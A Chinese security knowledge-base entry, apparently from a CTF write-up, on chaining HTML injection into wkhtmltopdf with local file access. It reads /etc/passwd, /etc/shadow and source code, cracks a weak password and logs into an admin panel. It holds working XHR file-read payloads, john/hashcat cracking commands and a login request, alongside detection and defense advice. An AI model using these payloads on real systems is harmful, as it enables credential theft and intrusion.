---
id: web-generic-xss-wkhtmltopdf-local-file-read-shadow-login
title: wkhtmltopdf HTML 注入读本地文件并破解 /etc/shadow 登录后台
type: scenario
domain: web
path: web/generic/xss
technique: wkhtmltopdf-local-file-access-shadow-crack
tags:
- web
- xss
- pdf
- wkhtmltopdf
- file-read
- shadow
- password-cracking
- flask
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:34:40+08:00'
  notes: 已对照原文 app.py 与 /etc/passwd、/etc/shadow 截图核对；弱口令爆破为原文流程；PoC 未复跑。
url: /docs/web/generic/xss/web-generic-xss-wkhtmltopdf-local-file-read-shadow-login/
draft: false
kb_aliases:
- wkhtmltopdf XSS
- HTML 转 PDF 本地文件读取
- --enable-local-file-access
- PDF 渲染器 XSS
- /etc/shadow 破解登录
---

## 一句话结论

当应用把用户提交的 HTML 交给 `wkhtmltopdf` 生成 PDF，且开启了 `--enable-local-file-access` 时，HTML 中的 JavaScript 会在本地文件上下文中执行，可用同步 `XMLHttpRequest` 读取 `file:///etc/passwd`、`file:///etc/shadow` 和源码；再破解 shadow 中的弱口令登录管理后台，拿到环境变量里的 flag。

## 原理

- `wkhtmltopdf` 使用 Qt WebKit 渲染 HTML，支持 JavaScript。默认情况下它可能限制本地文件访问，但 `--enable-local-file-access` 会允许页面通过 `file://` 读取本机文件；这使 HTML 注入直接升级为本地文件读取。
- 应用把用户提交的 `content` 直接嵌入 `document.html` 模板，再写入与当前请求同目录的临时 HTML 文件，最后用 `wkhtmltopdf` 转 PDF。页面来源是 `file:///usr/src/app/<id>.html`，因此 XHR 的 `file://` 请求不受同源策略限制，且 `x.open(..., false)` 的同步模式能在渲染完成前拿到文件内容并写入 DOM/PDF。
- 目标只做了单点过滤：`if '/environ' in html_content: return ' :)'`。这会阻止读取 `/proc/1/environ`，但不影响 `/etc/passwd`、`/etc/shadow`、`/usr/src/app/app.py` 等路径；攻击者可以先用 `document.write(window.location)` 确认页面处于 `file://` 上下文，再逐个读取。
- 读到的 `app.py` 暴露了 `/admin` 的认证逻辑：`spwd.getspnam(username).sp_pwd` 取系统 shadow 哈希，`crypt.crypt(password, pw1)` 计算用户输入，`compare_hash` 比较。也就是说管理员账号就是系统用户 `WeakPassword_Admin`，密码校验直接对 `/etc/shadow` 中的哈希进行。
- 从 `/etc/passwd` 枚举用户、从 `/etc/shadow` 取哈希后，用 john/hashcat 对 `$1$`（md5crypt）等格式做字典/规则爆破；本例弱口令很快命中，登录 `/admin` 后页面返回 `os.environ['FLAG']`。
- 根因是多层问题叠加：HTML 注入、PDF 渲染器开启本地文件访问、过滤只覆盖一个路径、管理员使用弱系统口令且 flag 放在进程环境变量中。

## 触发条件

- 应用把用户可控 HTML 交给 `wkhtmltopdf`（或其他支持 JS 的 HTML 转 PDF 引擎）渲染。
- 渲染命令包含 `--enable-local-file-access`（或同等允许本地文件的配置）。
- 过滤只做少量关键字（如只拦 `/environ`），未禁用 `<script>`、未做 HTML 清洗。
- 目标容器内有可读的 `/etc/passwd`、`/etc/shadow`，且管理员为系统弱口令用户；或存在其他可读配置文件/源码泄露凭据。
- 攻击者能提交 HTML 并取回生成的 PDF（或渲染结果）。

## 利用步骤

1. 提交 `<script>document.write(window.location)</script>`，在返回的 PDF 中确认页面 URL 为 `file:///...`，证明 JS 在本地文件上下文执行。
2. 构造同步 XHR 读取目标文件，把内容写入 `document.body`，例如 `/etc/passwd`、`/etc/shadow`、`/usr/src/app/app.py`。
3. 从源码确认管理后台的认证方式与用户名；从 passwd 找到系统用户，从 shadow 取出对应哈希。
4. 用 john/hashcat 对哈希做字典爆破，得到明文密码。
5. 用该用户名/密码登录 `/admin`，读取返回的环境变量 flag。

## PoC

读取任意本地文件（不含 `/environ` 字样即可绕过单点过滤）：

```html
<script>
var x = new XMLHttpRequest();
x.open("GET", "file:///etc/passwd", false);
x.send();
document.write("<pre>" + x.responseText + "</pre>");
</script>
```

读取源码与 shadow：

```html
<script>
function read(p){
  var x = new XMLHttpRequest();
  x.open("GET", "file://" + p, false);
  x.send();
  document.write("<pre>" + p + "\n" + x.responseText + "</pre>");
}
read("/usr/src/app/app.py");
read("/etc/shadow");
</script>
```

破解 shadow 哈希：

```bash
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# 或 hashcat -m 500 hashes.txt rockyou.txt   # $1$ md5crypt
```

登录：

```bash
curl -i -X POST http://target/admin -d 'username=WeakPassword_Admin&password=<cracked>'
```

## 变体与关联

- 变体：过滤 `/environ` 时改用 `/proc/1/cmdline`、`/proc/1/cwd/...`、`/proc/self/environ` 的其他拼写（若过滤不严谨）、`/etc/hostname`、源码/配置文件；重点是找未过滤的敏感文件。
- 变体：PDF 引擎换成 Puppeteer/Playwright/Headless Chrome 时，若允许 `file://` 且未隔离，同样可读本地文件；若只允许 HTTP，可尝试 SSRF 访问内网。
- 变体：没有 XSS 回显时，用 `fetch` 把文件内容外带到攻击者服务器，或利用 PDF 中的链接/表单提交外带。
- 关联：[[web-generic-xss-pdf-javascript-inline-preview]]（PDF 内 JavaScript）、[[web-generic-xxe-inband-file-read-default-insecure]]（另一类文件读取）、[[web-generic-file-inclusion-windows-sam-ntlm-crack]]（读取系统凭据哈希后破解）。
- 边界：渲染器禁用 JavaScript、移除 `--enable-local-file-access`、以只读沙箱/独立低权限用户运行、shadow 不可读或口令为强随机值时，本链失效。

## 检测与防御

- 不要把用户 HTML 直接交给 PDF 渲染器；使用固定模板 + 文本转义，或先做严格 HTML 清洗（移除 `<script>`、事件属性、`file:`/`javascript:` URL）。
- 关闭 PDF 渲染器的本地文件访问（去掉 `--enable-local-file-access`），禁用 JavaScript，使用无网络、只读文件系统、低权限用户的隔离容器。
- 管理后台不要直接依赖系统 shadow 认证；使用独立的应用账号体系、强口令、MFA，flag/密钥不要放在 Web 进程环境变量中。
- 检测：PDF 生成请求中出现 `<script>`、`XMLHttpRequest`、`file://`、`/etc/passwd`、`/etc/shadow`、`/proc`；渲染进程异常读取敏感文件；短时间大量 `/admin` 登录失败或异常成功。
- 响应：轮换泄露凭据、隔离渲染服务、检查同容器内其他文件与进程。
